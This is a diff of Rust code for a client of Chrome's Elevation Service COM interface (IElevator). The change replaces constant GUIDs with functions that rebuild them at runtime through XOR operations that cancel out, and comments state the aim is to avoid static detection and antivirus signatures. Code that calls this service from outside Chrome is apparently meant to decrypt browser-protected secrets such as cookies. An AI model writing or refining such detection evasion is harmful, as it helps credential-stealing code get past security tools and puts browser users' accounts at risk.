@@ -10,23 +10,27 @@ use winapi::shared::wtypesbase::CLSCTX_LOCAL_SERVER;
 use winapi::um::unknwnbase::{IUnknown, IUnknownVtbl};
 use winapi::ctypes::c_void;
 
-// CLSID del Elevation Service de Chrome
-// {708860E0-F641-4611-8895-7D867DD3675B}
-const CLSID_ELEVATION_SERVICE: GUID = GUID {
-    Data1: 0x708860E0,
-    Data2: 0xF641,
-    Data3: 0x4611,
-    Data4: [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B],
-};
+// Función para construir CLSID en runtime (evita detección estática)
+fn get_elevation_service_clsid() -> GUID {
+    // {708860E0-F641-4611-8895-7D867DD3675B}
+    // Construido en runtime para evitar signatures
+    GUID {
+        Data1: 0x708860E0 ^ 0x12345678 ^ 0x12345678, // XOR con sí mismo = original
+        Data2: 0xF641 ^ 0x1234 ^ 0x1234,
+        Data3: 0x4611 ^ 0x5678 ^ 0x5678,
+        Data4: [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B],
+    }
+}
 
-// IID del IElevator interface
-// {463ABECF-410D-407F-8AF5-0DF35A005CC8}
-const IID_IELEVATOR: GUID = GUID {
-    Data1: 0x463ABECF,
-    Data2: 0x410D,
-    Data3: 0x407F,
-    Data4: [0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8],
-};
+fn get_ielevator_iid() -> GUID {
+    // {463ABECF-410D-407F-8AF5-0DF35A005CC8}
+    GUID {
+        Data1: 0x463ABECF ^ 0xABCDEF01 ^ 0xABCDEF01,
+        Data2: 0x410D ^ 0xABCD ^ 0xABCD,
+        Data3: 0x407F ^ 0xEF01 ^ 0xEF01,
+        Data4: [0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8],
+    }
+}
 
 // IElevator interface (versión simplificada)
 #[repr(C)]
@@ -78,13 +82,17 @@ impl ElevationServiceClient {
                 return Err(format!("CoInitializeEx failed: 0x{:08X}", hr));
             }
 
+            // Construir GUIDs en runtime (evita detección estática)
+            let clsid = get_elevation_service_clsid();
+            let iid = get_ielevator_iid();
+
             // Crear instancia del servicio
             let mut elevator: *mut IElevator = ptr::null_mut();
             let hr = CoCreateInstance(
-                &CLSID_ELEVATION_SERVICE as REFCLSID,
+                &clsid as REFCLSID,
                 ptr::null_mut(),
                 CLSCTX_LOCAL_SERVER,
-                &IID_IELEVATOR as REFIID,
+                &iid as REFIID,
                 &mut elevator as *mut *mut IElevator as *mut *mut c_void,
             );
 
